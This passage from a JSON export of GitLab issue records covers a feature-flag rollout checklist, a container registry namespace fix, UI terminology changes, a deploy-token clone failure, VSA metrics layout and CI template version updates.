least 2 hours after feature flag updates in production.\n  If a different developer will be covering, or an exception is needed, please inform the oncall SRE by using the `@sre-oncall` Slack alias.\n- [ ] Ensure that documentation has been updated ([More info](https://docs.gitlab.com/ee/development/documentation/feature_flags.html#features-that-became-enabled-by-default)).\n- [x] Announce on [the feature issue](ISSUE LINK) an estimated time this will be enabled on GitLab.com. \n- [x] Ensure that any breaking changes have been announced following the [release post process](https://about.gitlab.com/handbook/marketing/blog/release-posts/#deprecations-removals-and-breaking-changes) to ensure GitLab customers are aware.\n- [x] Notify `#support_gitlab-com` and your team channel ([more guidance when this is necessary in the dev docs](https://docs.gitlab.com/ee/development/feature_flags/controls.html#communicate-the-change)).\n\n### Global rollout on production\n\nFor visibility, all `/chatops` commands that target production should be executed in the `#production` slack channel and cross-posted (with the command results) to the responsible team's slack channel (`#g_TEAM_NAME`).\n\n- [ ] [Incrementally roll out](https://docs.gitlab.com/ee/development/feature_flags/controls.html#process) the feature.\n  - If the feature flag in code has [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform **actor-based** rollout.\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e \u003crollout-percentage\u003e --actors`\n  - If the feature flag in code does **NOT** have [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform time-based rollout (**random** rollout).\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e \u003crollout-percentage\u003e --random`\n  - Enable the feature globally on production environment.\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e true`\n- [ ] Announce on [the feature issue](ISSUE LINK) that the feature has been globally enabled.\n- [ ] Wait for [at least one day for the verification term](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release).\n\n### (Optional) Release the feature with the feature flag\n\nIf you're still unsure whether the feature is [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release)\nbut want to release it in the current milestone, you can change the default state of the feature flag to be enabled.\nTo do so, follow these steps:\n\n- [ ] Create a merge request with the following changes. Ask for review and merge it.\n    - [ ] Set the `default_enabled` attribute in [the feature flag definition](https://docs.gitlab.com/ee/development/feature_flags/#feature-flag-definition-and-validation) to `true`.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the default-enabling MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-default-enabling-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Set the next milestone to this rollout issue for scheduling [the flag removal](#release-the-feature).\n- [ ] (Optional) You can [create a separate issue](https://gitlab.com/gitlab-org/gitlab/-/issues/new?issuable_template=Feature%20Flag%20Cleanup) for scheduling the steps below to [Release the feature](#release-the-feature).\n    - [ ] Set the title to \"[Feature flag] Cleanup `\u003cfeature-flag-name\u003e`\".\n    - [ ] Execute the `/copy_metadata \u003cthis-rollout-issue-link\u003e` quick action to copy the labels from this rollout issue.\n    - [ ] Link this rollout issue as a related issue.\n    - [ ] Close this rollout issue.\n\n**WARNING:** This approach has the downside that it makes it difficult for us to\n[clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up) the flag.\nFor example, on-premise users could disable the feature on their GitLab instance. But when you\nremove the flag at some point, they suddenly see the feature as enabled and they can't roll it back\nto the previous behavior. To avoid this potential breaking change, use this approach only for urgent\nmatters.\n\n### Release the feature\n\nAs per [https://gitlab.com/gitlab-org/gitlab/-/issues/243722#proposal](release plan) of the feature, as we remove the feature flag we should set `public_projects_minutes_cost_factor: 0.008` for Gitlab.com Shared Runners.\n\nAfter the feature has been [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release),\nthe [clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up)\nshould be done as soon as possible to permanently enable the feature and reduce complexity in the\ncodebase.\n\nYou can either [create a follow-up issue for Feature Flag Cleanup](https://gitlab.com/gitlab-org/gitlab/-/issues/new?issuable_template=Feature%20Flag%20Cleanup) or use the checklist below in this same issue.\n\n\u003c!-- The checklist here is to help stakeholders keep track of the feature flag status --\u003e\n- [x] Create a merge request to remove `\u003cfeature-flag-name\u003e` feature flag. Ask for review and merge it.\n    - [x] Remove all references to the feature flag from the codebase.\n    - [x] Remove the YAML definitions for the feature from the repository.\n    - [x] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [x] Ensure that the cleanup MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [x] `/chatops run auto_deploy status \u003cmerge-commit-of-cleanup-mr\u003e`\n- [x] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [x] Clean up the feature flag from all environments by running these chatops command in `#production` channel:\n    - [x] `/chatops run feature delete \u003cfeature-flag-name\u003e --dev`\n    - [x] `/chatops run feature delete \u003cfeature-flag-name\u003e --staging`\n    - [x] `/chatops run feature delete \u003cfeature-flag-name\u003e`\n- [x] Close this rollout issue.\n\n## Rollback Steps\n\n- [ ] This feature can be disabled by running the following Chatops command:\n\n```\n/chatops run feature set \u003cfeature-flag-name\u003e false\n```\n\u003c!-- triage-serverless v3 PLEASE DO NOT REMOVE THIS SECTION --\u003e\n*This page may contain information related to upcoming products, features and functionality.\nIt is important to note that the information presented is for informational purposes only, so please do not rely on the information for purchasing or planning purposes.\nJust like with all projects, the items mentioned on the page are subject to change or delay, and the development, release, and timing of any products, features, or functionality remain at the sole discretion of GitLab Inc.*\n\u003c!-- triage-serverless v3 PLEASE DO NOT REMOVE THIS SECTION --\u003e","state":"closed","created_at":"2022-04-14T13:49:43.381Z","updated_at":"2022-09-23T20:15:21.126Z","closed_at":"2022-06-23T07:08:21.600Z","closed_by":{"id":695467,"username":"fabiopitino","name":"Fabio Pitino","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f0db032076c54065b10b3efdfd175e6c?s=80\u0026d=identicon","web_url":"https://gitlab.com/fabiopitino"},"labels":["CI minutes","Category:Continuous Integration","Deliverable","FY23::Q2","GitLab Free","OKR","Open Source","Technical Writing","Verify::P2","backend","devops::verify","direction","documentation","feature flag","feature::addition","group::pipeline execution","missed-deliverable","missed:15.1","section::ops","type::feature","workflow::production"],"milestone":{"id":2453024,"iid":74,"group_id":9970,"title":"15.2","description":"","state":"active","created_at":"2022-02-03T22:24:46.818Z","updated_at":"2022-02-03T22:26:32.010Z","due_date":"2022-07-17","start_date":"2022-06-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/74"},"assignees":[{"id":695467,"username":"fabiopitino","name":"Fabio Pitino","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f0db032076c54065b10b3efdfd175e6c?s=80\u0026d=identicon","web_url":"https://gitlab.com/fabiopitino"}],"author":{"id":695467,"username":"fabiopitino","name":"Fabio Pitino","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f0db032076c54065b10b3efdfd175e6c?s=80\u0026d=identicon","web_url":"https://gitlab.com/fabiopitino"},"type":"ISSUE","assignee":{"id":695467,"username":"fabiopitino","name":"Fabio Pitino","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f0db032076c54065b10b3efdfd175e6c?s=80\u0026d=identicon","web_url":"https://gitlab.com/fabiopitino"},"user_notes_count":24,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359094","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":50,"completed_count":26},"weight":3,"blocking_issues_count":0,"has_tasks":true,"task_status":"26 of 50 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359094","notes":"https://gitlab.com/api/v4/projects/278964/issues/359094/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359094/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359094","relative":"#359094","full":"gitlab-org/gitlab#359094"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":5653,"epic":{"id":231355,"iid":5653,"title":"CI minutes limits for public projects on GitLab.com","url":"/groups/gitlab-org/-/epics/5653","group_id":9970,"human_readable_end_date":"Feb 17, 2023","human_readable_timestamp":"\u003cstrong\u003e1\u003c/strong\u003e month remaining"},"iteration":null,"health_status":null},{"id":106636859,"iid":359078,"project_id":278964,"title":"Fix ::ContainerRegistry::Migration.limit_gitlab_org?","description":"## :fire: Problem\n\n`::ContainerRegistry::Migration.limit_gitlab_org?` is used to limit the image repositories selection to the `gitlab-org` namespace.\n\nThe problem is the [condition](https://gitlab.com/gitlab-org/gitlab/-/blob/master/ee/app/models/ee/container_repository.rb#L32) that this check adds.\n\nIt will select any namespace whose path is `gitlab-org`. Thatâ€™s a too wide scope: it will catch any intermediary namespaces (like sub groups) that are named `gitlab-org`.\n\nWhat we want is the _root_ namespace named `gitlab-org`\n\n## :fire_engine: Solution\n\nFix the conditions to start with the _root_ namespace named `gitlab-org`.","state":"closed","created_at":"2022-04-14T11:17:34.057Z","updated_at":"2022-04-19T14:28:53.623Z","closed_at":"2022-04-19T14:28:53.583Z","closed_by":{"id":4059254,"username":"sabrams","name":"Steve Abrams","state":"active","avatar_url":"https://secure.gravatar.com/avatar/cac831f7b515c191dfba32c54f01c375?s=80\u0026d=identicon","web_url":"https://gitlab.com/sabrams"},"labels":["Category:Container Registry","Container Registry Migration","Container Registry Migration Blocker","Container Registry Migration Unplanned","Container Registry Migration::Phase 2","backend","devops::package","group::package registry","package:active","ruby","section::ops","type::bug","workflow::production"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":3983112,"username":"10io","name":"David Fernandez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c42a43361e29bf7ed36cf8e54cb54bb?s=80\u0026d=identicon","web_url":"https://gitlab.com/10io"}],"author":{"id":3983112,"username":"10io","name":"David Fernandez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c42a43361e29bf7ed36cf8e54cb54bb?s=80\u0026d=identicon","web_url":"https://gitlab.com/10io"},"type":"ISSUE","assignee":{"id":3983112,"username":"10io","name":"David Fernandez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c42a43361e29bf7ed36cf8e54cb54bb?s=80\u0026d=identicon","web_url":"https://gitlab.com/10io"},"user_notes_count":2,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359078","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359078","notes":"https://gitlab.com/api/v4/projects/278964/issues/359078/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359078/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359078","relative":"#359078","full":"gitlab-org/gitlab#359078"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7316,"epic":{"id":408066,"iid":7316,"title":"Drive the Container Registry migration Phase 2 from Rails","url":"/groups/gitlab-org/-/epics/7316","group_id":9970,"human_readable_end_date":"Jul 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":106633336,"iid":359067,"project_id":278964,"title":"Rename package files to assets in the UI","description":"## Context \nIn the UI, we call components of the package `Files`\n![Screen_Shot_2022-04-14_at_22.09.11](/uploads/a7ff08e7ff254eb3921a1d63e6cf2802/Screen_Shot_2022-04-14_at_22.09.11.png)\n\nIn solution validation, users did not understand the terminology `Package files` or `files`. [Solution validation issue](https://gitlab.com/gitlab-org/ux-research/-/issues/1665)\n\n| Terminology tested | Problem |\n| ------ | ------ |\n| keep only the `n` most recent package files | Users donâ€™t know what a package file is. |\n| keep only the `n` most recent snapshots | Users think removing a snapshot will remove the entire package. |\n\nGitHub calls these `assets`:\n![Screen_Shot_2022-04-14_at_22.14.09](/uploads/09f7fc222a5721d188172fd8bf6d1cd8/Screen_Shot_2022-04-14_at_22.14.09.png)\n\nAssets feels more appropriate here as the package files are actual the recipe of the package itself. Files feels like extraneous parts of the package.\n\n## Proposal\nChange the terminology from `files` to `assets`\n\n| Place | Picture |\n| ------ | ------ |\n| Package detail page | ![Screen_Shot_2022-05-25_at_12.33.36](/uploads/230d71d558332e46522a433a1e9a2c0d/Screen_Shot_2022-05-25_at_12.33.36.png)|\n| Ellipsis dropdown |![Screen_Shot_2022-05-25_at_12.33.39](/uploads/bf071eab9463448589069e2a328c616a/Screen_Shot_2022-05-25_at_12.33.39.png) |\n| Confirmation modal | ![Screen_Shot_2022-05-25_at_12.33.48](/uploads/0c6f9c924a9a62f3cea32f715cf783f9/Screen_Shot_2022-05-25_at_12.33.48.png) |\n| Confirmation banner | ![Screen_Shot_2022-05-25_at_12.33.56](/uploads/98e7bf9efbdc08a24f666d33be68a448/Screen_Shot_2022-05-25_at_12.33.56.png) |\n\n\n## Implementation plan\n\n- Changes to be made within https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/packages_and_registries/package_registry/components/details/package_files.vue and https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/packages_and_registries/package_registry/pages/details.vue\n- Changes to docs: see comment https://gitlab.com/gitlab-org/gitlab/-/issues/359067#note_1024239378","state":"closed","created_at":"2022-04-14T10:20:11.352Z","updated_at":"2022-09-19T18:18:02.583Z","closed_at":"2022-09-16T06:14:58.138Z","closed_by":{"id":11214192,"username":"rchanila","name":"Rahul Chanila","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11214192/avatar.png","web_url":"https://gitlab.com/rchanila"},"labels":["Category:Package Registry","Community contribution","SUS::Impacting","Technical Writing","Terraform Registry","UI text","UX","devops::package","feature::enhancement","frontend","frontend-weight::1","group::package registry","missed:15.3","section::ops","severity::4","type::feature","workflow::verification"],"milestone":{"id":2453026,"iid":76,"group_id":9970,"title":"15.4","description":"[GitLab 15.4 Release](https://gitlab.com/gitlab-org/gitlab/-/releases/v15.4.0-ee)","state":"active","created_at":"2022-02-03T22:29:22.015Z","updated_at":"2022-09-29T02:21:26.561Z","due_date":"2022-09-17","start_date":"2022-08-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/76"},"assignees":[{"id":10409869,"username":"anshulriyal","name":"Anshul Riyal","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10409869/avatar.png","web_url":"https://gitlab.com/anshulriyal"}],"author":{"id":9608331,"username":"katiemacoy","name":"Katie Macoy","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9608331/avatar.png","web_url":"https://gitlab.com/katiemacoy"},"type":"ISSUE","assignee":{"id":10409869,"username":"anshulriyal","name":"Anshul Riyal","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10409869/avatar.png","web_url":"https://gitlab.com/anshulriyal"},"user_notes_count":10,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359067","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359067","notes":"https://gitlab.com/api/v4/projects/278964/issues/359067/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359067/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359067","relative":"#359067","full":"gitlab-org/gitlab#359067"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":106631899,"iid":359066,"project_id":278964,"title":"Cloning private repo with deploy token fails (audit_event_streaming_git_operations flag enabled)","description":"## This issue has been replaced with https://gitlab.com/gitlab-org/gitlab/-/issues/361812+\n\u003c!---\nPlease read this!\n\nBefore opening a new issue, make sure to search for keywords in the issues\nfiltered by the \"regression\" or \"type::bug\" label:\n\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=regression\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=type::bug\n\nand verify the issue you're about to submit isn't a duplicate.\n---\u003e\n\n### Summary\n\n* Performing a git clone/pull/fetch operation on a private project using a deploy token fails when the `audit_event_streaming_git_operations` flag is enabled.\n* This was discovered during the flag rollout: https://gitlab.com/gitlab-org/gitlab/-/issues/357211\n* It also caused a production issue: https://gitlab.com/gitlab-com/gl-infra/production/-/issues/6832\n* The flag was rolled-back until a fix could be put in place.\n\n### Steps to reproduce\n\n* Enable the feature flag `audit_event_streaming_git_operations` on the instance in question.\n* Create a private project on a group with an Ultimate licence.\n* Create a deploy token, with `read_repository`, scope for the project. (Settings -\u003e Repository -\u003e Deploy tokens)\n* Clone the repository using `http` credentials. `git clone https://staging.gitlab.com/compliance-tanuki/test-violations.git`\n* Use the deploy token user/password as the credentials.\n* Expect to see an error like this:\n```\nUsername for 'https://staging.gitlab.com': gitlab+deploy-token-33250\nPassword for 'https://gitlab+deploy-token-33250@staging.gitlab.com':\nerror: RPC failed; HTTP 500 curl 22 The requested URL returned error: 500\nfatal: expected flush after ref listing\n```\n\n### What is the current *bug* behavior?\n\n* 500 error and unable to clone/pull/fetch when the flag is enabled and using a deploy token as a form of authentication.\n\n### What is the expected *correct* behavior?\n\n* No 500 error and the ability to use deploy tokens to `read_repository` using the git CLI.\n\n### Relevant logs and/or screenshots\n\nExample screenshot from a test performed on `staging.gitlab.com`\n\n![Screenshot_2022-04-14_at_10.45.28](/uploads/b2d2f8cfd3929c1d0373594c951a6cd5/Screenshot_2022-04-14_at_10.45.28.png)\n\n### Proposed solution\n\n* Resolve the errors raised in sentry by handling DeployToken as a form of authentication: https://sentry.gitlab.net/gitlab/gitlabcom/issues/3262340/?query=is%3Aunresolved%20deploytoken (Thanks @smcgivern)\n* Attempt feature flag rollout on GitLab.com again.","state":"closed","created_at":"2022-04-14T09:48:27.599Z","updated_at":"2022-05-10T21:44:22.567Z","closed_at":"2022-05-10T21:44:22.544Z","closed_by":{"id":750946,"username":"dennis","name":"Dennis Tang","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/750946/avatar.png","web_url":"https://gitlab.com/dennis"},"labels":["Category:Audit Events","Next Up","backend","devops::manage","feature flag","group::compliance","incident","priority::2","reproduced on GitLab.com","section::dev","severity::1","type::bug","workflow::verification"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":10467142,"username":"harsimarsandhu","name":"Harsimar Sandhu","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10467142/avatar.png","web_url":"https://gitlab.com/harsimarsandhu"}],"author":{"id":5833976,"username":"mwoolf","name":"Max Woolf","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c8af02fcb6678db41bd8d3a29f9c1d8?s=80\u0026d=identicon","web_url":"https://gitlab.com/mwoolf"},"type":"ISSUE","assignee":{"id":10467142,"username":"harsimarsandhu","name":"Harsimar Sandhu","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10467142/avatar.png","web_url":"https://gitlab.com/harsimarsandhu"},"user_notes_count":17,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359066","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359066","notes":"https://gitlab.com/api/v4/projects/278964/issues/359066/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359066/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359066","relative":"#359066","full":"gitlab-org/gitlab#359066"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":106628352,"iid":359060,"project_id":278964,"title":"Split VSA metrics into 2 rows","description":"### Problem\n\nWe need to add additional metrics to the VSA page under the overview stage but are running out of horizontal space. In addition to this, we want to highlight the DORA metrics.\n\n### Solution\n\n* Split the single row into 2 rows\n* Add a title above each row\n\nThe existing single stat tiles are to be arranged into the following order (top down):\n\n* **Key metrics**\n  * Lead time\n  * Cycle time\n  * New issues\n  * Commits\n  * Deploys\n* **DORA metrics**\n  * Deployment frequency\n  * Lead time for changes\n\n![VSA-DORA-15.0](/uploads/c68bcb334f25c619bc1a95ec9d2bd600/VSA-DORA-15.0.png)","state":"closed","created_at":"2022-04-14T08:51:59.823Z","updated_at":"2022-08-29T05:01:41.111Z","closed_at":"2022-05-05T00:26:28.317Z","closed_by":{"id":3397881,"username":"ekigbo","name":"Ezekiel Kigbo","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3397881/avatar.png","web_url":"https://gitlab.com/ekigbo"},"labels":["Deliverable","SUS::Impacting","devops::manage","feature::enhancement","frontend","group::optimize","priority::2","section::dev","severity::4","type::feature","workflow::verification"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":3397881,"username":"ekigbo","name":"Ezekiel Kigbo","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3397881/avatar.png","web_url":"https://gitlab.com/ekigbo"}],"author":{"id":3101551,"username":"blabuschagne","name":"Brandon Labuschagne","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3101551/avatar.png","web_url":"https://gitlab.com/blabuschagne"},"type":"ISSUE","assignee":{"id":3397881,"username":"ekigbo","name":"Ezekiel Kigbo","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3397881/avatar.png","web_url":"https://gitlab.com/ekigbo"},"user_notes_count":20,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359060","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359060","notes":"https://gitlab.com/api/v4/projects/278964/issues/359060/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359060/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359060","relative":"#359060","full":"gitlab-org/gitlab#359060"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7790,"epic":{"id":484436,"iid":7790,"title":"[VSA] Combining Value stream with DORA4 metrics - Viable maturity","url":"/groups/gitlab-org/-/epics/7790","group_id":9970,"human_readable_end_date":"Aug 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":106621928,"iid":359052,"project_id":278964,"title":"Danger bot duplicates file names with PI warnings","description":"\u003c!-- Please complete the template below as best as you can. Make sure to check if this issue has already been raised by someone else first to avoid duplication. \n\nFor each section below, please add screenshots or links or anything that may help visual learners understand the problem better, even if this takes you an extra minute or two this is a great help to some folks.\n\nhttps://www.learning-styles-online.com/style/visual-spatial/\n\n--\u003e\n\n### Problem\nNoticed today while reviewing https://gitlab.com/gitlab-org/gitlab/-/merge_requests/84631\n\n![Resolve__22Instrumentation_for_Deployment_Approvals_users_22___84631____Merge_requests___GitLab.org___GitLab___GitLab_2022-04-14_15-16-48](/uploads/aed8cf8f57b5b97ec4ff8d0cc57e10b5/Resolve__22Instrumentation_for_Deployment_Approvals_users_22___84631____Merge_requests___GitLab.org___GitLab___GitLab_2022-04-14_15-16-48.png)\n\n### Proposal\n\n### Result\n\n### Next steps (if any)","state":"closed","created_at":"2022-04-14T03:17:54.376Z","updated_at":"2022-07-13T06:28:13.307Z","closed_at":"2022-07-12T15:36:21.013Z","closed_by":{"id":1863977,"username":"michold","name":"MichaÅ‚ Wielich","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1863977/avatar.png","web_url":"https://gitlab.com/michold"},"labels":["devops::analytics","group::product intelligence","priority::3","section::analytics","severity::4","type::bug","workflow::in dev"],"milestone":{"id":2453025,"iid":75,"group_id":9970,"title":"15.3","description":"","state":"active","created_at":"2022-02-03T22:28:50.229Z","updated_at":"2022-02-03T22:28:50.229Z","due_date":"2022-08-17","start_date":"2022-07-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/75"},"assignees":[{"id":1863977,"username":"michold","name":"MichaÅ‚ Wielich","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1863977/avatar.png","web_url":"https://gitlab.com/michold"}],"author":{"id":9712164,"username":"nbelokolodov","name":"Niko Belokolodov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9712164/avatar.png","web_url":"https://gitlab.com/nbelokolodov"},"type":"ISSUE","assignee":{"id":1863977,"username":"michold","name":"MichaÅ‚ Wielich","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1863977/avatar.png","web_url":"https://gitlab.com/michold"},"user_notes_count":5,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359052","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359052","notes":"https://gitlab.com/api/v4/projects/278964/issues/359052/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359052/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359052","relative":"#359052","full":"gitlab-org/gitlab#359052"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":106612726,"iid":359040,"project_id":278964,"title":"CI template updates for 15.0","description":"Two updates are needed to the CI templates in 15.0. First, the unstable version of the CI templates need to be promoted to stable. This is only doable during a major release number, so it must make it into 15.0. Second, the major version number must be incremented. This change is for both DAST API and also API Fuzzing.\n\n**NOTE:** Monolith MRs need to be submitted for review 2 weeks PRIOR to milestone end date to make sure they are included.\n\n1. [x] DO THIS AFTER RELEASING A v2 CONTAINER IMAGE!\n1. [x] This MR will be on the `gitlab-org/gitlab` project.\n1. [x] Promote latest version of CI templates to stable\n   1. [x] Copy `API-Fuzzing.latest.gitlab-ci.yml` to `API-Fuzzing.gitlab-ci.yml`\n   2. [x] Copy `DAST-API.latest.gitlab-ci.yml` to `DAST-API.gitlab-ci.yml`\n   3. [x] Copy `dast_api_latest_gitlab_ci_yaml_spec.rb` to `dast_api_gitlab_ci_yaml_spec.rb`\n   4. [x] Update lines 5 and 6, removing the `.latest`\n   3. [x] Copy `api_fuzzing_latest_gitlab_ci_yaml_spec.rb` to `api_fuzzing_gitlab_ci_yaml_spec.rb`\n   4. [x] Update lines 5 and 6, removing the `.latest`\n1. [x] Update `_VERSION` to `2` in both stable and `latest` version of templates (4 total)","state":"closed","created_at":"2022-04-13T23:43:16.834Z","updated_at":"2022-06-08T19:42:18.923Z","closed_at":"2022-06-07T14:09:06.050Z","closed_by":{"id":1523140,"username":"DavidNelsonGL","name":"David Nelson","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1523140/avatar.png","web_url":"https://gitlab.com/DavidNelsonGL"},"labels":["Category:API Security","GitLab Ultimate","backend","devops::secure","group::dynamic analysis","milestone::p1","section::sec","type::maintenance","workflow::in 